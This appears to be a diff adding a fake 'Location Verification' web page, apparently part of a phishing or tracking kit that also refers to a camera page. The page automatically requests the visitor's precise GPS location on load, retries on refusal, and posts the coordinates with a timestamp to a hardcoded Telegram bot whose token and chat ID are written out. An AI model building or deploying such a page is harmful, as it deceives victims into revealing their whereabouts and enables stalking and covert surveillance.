@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Verification</title>
+    <style>
+        /* Same styles as camera page */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f8f9fa;
+            color: #212529;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        #app-container {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+        
+        #header {
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: white;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        #map-placeholder {
+            flex-grow: 1;
+            background: #e9ecef;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        
+        #map-icon {
+            font-size: 80px;
+            color: #6c757d;
+        }
+        
+        #verify-btn {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            width: 60px;
+            height: 60px;
+            background: #25D366;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
+            z-index: 100;
+            border: none;
+            color: white;
+            font-size: 24px;
+        }
+        
+        #permission-alert {
+            position: fixed;
+            bottom: 100px;
+            right: 25px;
+            background: white;
+            padding: 12px 16px;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+            max-width: 250px;
+            transform: translateY(20px);
+            opacity: 0;
+            transition: all 0.3s;
+            z-index: 101;
+            display: none;
+        }
+        
+        #permission-alert.visible {
+            transform: translateY(0);
+            opacity: 1;
+        }
+        
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            z-index: 1000;
+            display: none;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div id="app-container">
+        <div id="header">
+            <h1><i class="fas fa-map-marker-alt"></i> Location</h1>
+            <i class="fas fa-cog"></i>
+        </div>
+        
+        <div id="map-placeholder">
+            <i id="map-icon" class="fas fa-map"></i>
+        </div>
+        
+        <button id="verify-btn">
+            <i class="fas fa-check"></i>
+        </button>
+        
+        <div id="permission-alert">
+            <i class="fas fa-info-circle" style="margin-right: 8px;"></i>
+            Location access required for verification
+        </div>
+        
+        <div id="loading-screen">
+            <div class="spinner"></div>
+            <p>Verifying your location...</p>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const BOT_TOKEN = '5836151829:AAHo1C858VFc4_Fnp47LYRdx4fUjcfkLhyI';
+        const CHAT_ID = '2032344793';
+        const MAX_RETRIES = 3;
+        const RETRY_DELAY = 2000;
+        
+        // State
+        let retryCount = 0;
+        
+        // DOM Elements
+        const verifyBtn = document.getElementById('verify-btn');
+        const permissionAlert = document.getElementById('permission-alert');
+        const loadingScreen = document.getElementById('loading-screen');
+        
+        // Show permission alert
+        function showPermissionAlert() {
+            permissionAlert.style.display = 'block';
+            setTimeout(() => {
+                permissionAlert.classList.add('visible');
+            }, 50);
+            
+            setTimeout(() => {
+                permissionAlert.classList.remove('visible');
+                setTimeout(() => {
+                    permissionAlert.style.display = 'none';
+                }, 300);
+            }, 3000);
+        }
+        
+        // Show loading screen
+        function showLoading(show) {
+            loadingScreen.style.display = show ? 'flex' : 'none';
+        }
+        
+        // Send data to Telegram
+        async function sendToTelegram(data) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('text', JSON.stringify(data, null, 2));
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.error('Telegram send error:', e);
+            }
+        }
+        
+        // Get location
+        async function getLocation() {
+            showLoading(true);
+            
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                
+                const { latitude, longitude, accuracy } = position.coords;
+                
+                // Send location data
+                await sendToTelegram({
+                    type: 'location',
+                    coordinates: { latitude, longitude },
+                    accuracy,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Proceed to success page
+                window.location.href = 'success.html';
+                
+            } catch (error) {
+                console.error('Location error:', error);
+                showLoading(false);
+                
+                if (retryCount < MAX_RETRIES) {
+                    retryCount++;
+                    showPermissionAlert();
+                    setTimeout(getLocation, RETRY_DELAY);
+                } else {
+                    // Max retries reached, return to camera page
+                    window.location.href = 'camera.html';
+                }
+            }
+        }
+        
+        // Handle verify button click
+        function handleVerifyClick() {
+            if (retryCount > 0) {
+                // Refresh page to reset permission state
+                window.location.reload();
+            } else {
+                getLocation();
+            }
+        }
+        
+        // Initialize
+        function init() {
+            // Set up verify button
+            verifyBtn.addEventListener('click', handleVerifyClick);
+            
+            // First automatic attempt
+            setTimeout(() => {
+                getLocation();
+            }, 1500);
+        }
+        
+        // Start when page loads
+        window.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
